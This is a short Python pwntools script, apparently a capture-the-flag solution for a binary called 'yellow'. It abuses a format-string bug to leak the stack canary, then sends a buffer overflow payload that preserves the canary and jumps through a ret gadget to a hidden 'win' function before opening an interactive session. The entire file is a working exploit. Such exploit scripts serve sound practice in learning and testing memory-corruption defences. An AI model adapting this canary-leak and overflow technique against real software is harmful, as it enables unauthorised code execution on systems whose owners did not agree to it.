from pwn import *
context.binary = binary = ELF("./yellow")

p = process()
#p = remote("0.0.0.0", 5000) # server location

p.sendline("%32$p | %29$p")
p.recvuntil("say:")

a = p.recvuntil("\n").strip().decode("utf-8")

b = int(a.split("|")[0].strip(), 16)
c = int(a.split("|")[1].strip(), 16)
log.success(f'Canary: {hex(c)}')
# binary.address = b - 0x122e
# log.success(f'PIE base: {hex(binary.address)}')
hidden_function = p64(binary.symbols.win)
rop = ROP(binary)
retgadget = rop.find_gadget(['ret'])[0]
log.info(f"Using ret gadget at: {hex(retgadget)}")

payload = b"A" * 24 + p64(c) + b"B" * 8 + p64(retgadget) + hidden_function

p.sendline(payload)

p.interactive()
